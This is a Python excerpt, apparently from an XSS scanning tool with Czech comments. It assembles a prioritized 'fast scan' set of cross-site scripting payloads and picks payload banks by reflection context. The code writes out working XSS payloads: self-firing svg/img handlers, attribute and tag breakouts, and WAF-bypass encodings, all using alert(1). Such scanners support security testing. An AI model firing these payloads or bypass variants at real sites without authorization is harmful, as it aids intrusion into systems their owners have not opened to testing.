def build_fast_payload_set(full_payloads: Optional[List[str]] = None,
                           budget: int = 25) -> List[str]:
    """v10.16: Chytrá redukce payloadů pro RYCHLÝ sken.

    Místo náhodného vzorku (jako dřív canary mód) vybere DETERMINISTICKY
    payloady s nejvyšším signálem — ty, co nejpravděpodobněji zaberou napříč
    kontexty. Princip převzatý z Dalfoxu: málo requestů, chytře vybraných.

    Skladba (priorita shora):
      1. Polyglot — jeden payload pokrývající víc kontextů najednou
         (script/attr/url/comment/title/textarea/svg) → max coverage/request.
      2. Self-firing payloady bez user-interaction (autofocus+onfocus, svg
         onload, img onerror) — spustí se samy, ideální pro detekci.
      3. Top 1-2 reprezentanti z každé context banky (script/attr/url/...).
      4. Pár encoding/WAF-bypass variant — když cíl filtruje basic payloady.

    Pokud `full_payloads` obsahuje vlastní seznam (např. z payloads.txt),
    jádro se zachová a doplní se reprezentanti z něj — respektuje uživatelský
    set, ale zůstane rychlý. `budget` = horní strop (default 25).
    """
    fast: List[str] = []
    seen: set = set()

    def _add(p: str) -> None:
        if p and p not in seen:
            seen.add(p)
            fast.append(p)

    # 1) Polyglot — nejvyšší coverage na jeden request
    _add(polyglot_payload())
    # 2) Self-firing jádro — spustí se bez interakce, vysoký signál
    _add("<svg onload=alert(1)>")
    _add("<img src=x onerror=alert(1)>")
    _add("\"><svg onload=alert(1)>")
    _add("'><svg onload=alert(1)>")
    _add("<script>alert(1)</script>")
    # 3) Top reprezentanti z každé context banky (script/attr/url/comment/style)
    _add(SCRIPT_CONTEXT_PAYLOADS[0])
    _add("${alert(1)}")
    _add('" autofocus onfocus=alert(1) x="')
    _add("' autofocus onfocus=alert(1) x='")
    _add("javascript:alert(1)")
    _add("--><svg onload=alert(1)>")
    _add("</style><svg onload=alert(1)>")
    _add("</title><svg onload=alert(1)>")
    _add("</textarea><svg onload=alert(1)>")
    # 4) Pár WAF-bypass/encoding variant
    _add("<sVg/oNloAd=alert(1)>")
    _add("<svg/onload=alert`1`>")
    _add("<img src=x onerror=alert&lpar;1&rpar;>")
    # Doplň reprezentanty z uživatelského setu (krátké/odlišné), drž rozpočet
    if full_payloads:
        for p in full_payloads:
            if len(fast) >= budget:
                break
            if 6 <= len(p) <= 120 and p not in seen:
                _add(p)
    return fast[:budget]


def get_context_payloads(context: str) -> List[str]:
    """
    Vrátí bank payloadů optimalizovanou pro daný kontext reflexe.
    Kontext je výstup z context_probe() nebo classify_reflection_context().
    """
    ctx = (context or "").lower()
    # Mapping klíčových slov z obou klasifikátorů
    if "script" in ctx:
        return SCRIPT_CONTEXT_PAYLOADS
    if "event" in ctx:  # event_handler
        return ATTR_CONTEXT_PAYLOADS  # event handlery řeš jako atribut
    if "href" in ctx or "url" in ctx or "src" in ctx:
        # A URL attribute is exploitable TWO ways and we can't tell which from the
        # context string alone: scheme injection at the value start
        # (javascript:/data: → URL bank) OR a quote breakout mid-value — the only
        # vector when a reflected query param sits inside href="?...&p=HERE", where
        # the scheme slot is already taken and every scheme payload is inert. Send
        # both banks (quote-breakout first) so mid-value href/src reflections are
        # actually caught. dict.fromkeys preserves order and de-dupes.
        return list(dict.fromkeys(ATTR_CONTEXT_PAYLOADS + URL_CONTEXT_PAYLOADS))
    if "attr" in ctx:
        return ATTR_CONTEXT_PAYLOADS
    if "comment" in ctx:
        return COMMENT_CONTEXT_PAYLOADS
    if "style" in ctx:
        return STYLE_CONTEXT_PAYLOADS
    # default: HTML body context
    return HTML_CONTEXT_PAYLOADS

 
